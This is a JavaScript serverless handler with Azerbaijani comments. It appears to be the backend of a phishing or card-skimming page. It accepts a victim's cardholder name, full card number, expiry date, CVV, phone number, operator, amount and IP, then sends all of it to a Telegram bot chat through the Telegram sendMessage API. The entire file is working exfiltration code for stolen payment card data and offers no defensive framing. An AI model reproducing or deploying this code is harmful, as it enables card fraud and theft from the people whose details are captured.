export default async function handler(req, res) {
  // CORS və Method Yoxlanışı
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Yalnız POST qəbul olunur' });
  }

  try {
    // req.body əgər string gələrsə, JSON kimi parse edirik
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const { name, cardNo, exp, cvv, oper, phone, amount, ip } = body;

    const TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT) {
      console.error('TELEGRAM_TOKEN və ya TELEGRAM_CHAT_ID Vercel-də təyin olunmayıb!');
      return res.status(500).json({ error: 'Server parametri əskikdir' });
    }

    const txt = `💳 *YENİ ÖDƏNİŞ MƏLUMATI*\n\n` +
                `👤 *Kart Sahibi:* \`${name ? name.toUpperCase() : 'Məlum değil'}\`\n` +
                `🔢 *Kart Nömrəsi:* \`${cardNo || 'Məlum değil'}\`\n` +
                `📅 *Müddət:* \`${exp || '—'}\`  |  🔒 *CVV:* \`${cvv || '—'}\`\n\n` +
                `📱 *Operator:* \`${oper || '—'}\`\n` +
                `📞 *Nömrə:* \`${phone || '—'}\`\n` +
                `💰 *Məbləğ:* \`${amount || '0'} AZN\`\n` +
                `🌐 *IP:* \`${ip || '—'}\``;

    const telegramRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT,
        text: txt,
        parse_mode: 'Markdown'
      })
    });

    const resData = await telegramRes.json();

    if (telegramRes.ok) {
      return res.status(200).json({ success: true });
    } else {
      console.error('Telegram API Error:', resData);
      return res.status(500).json({ error: resData.description || 'Telegram xətası' });
    }
  } catch (err) {
    console.error('Server Crash:', err);
    return res.status(500).json({ error: 'Server daxili xətası' });
  }
        }
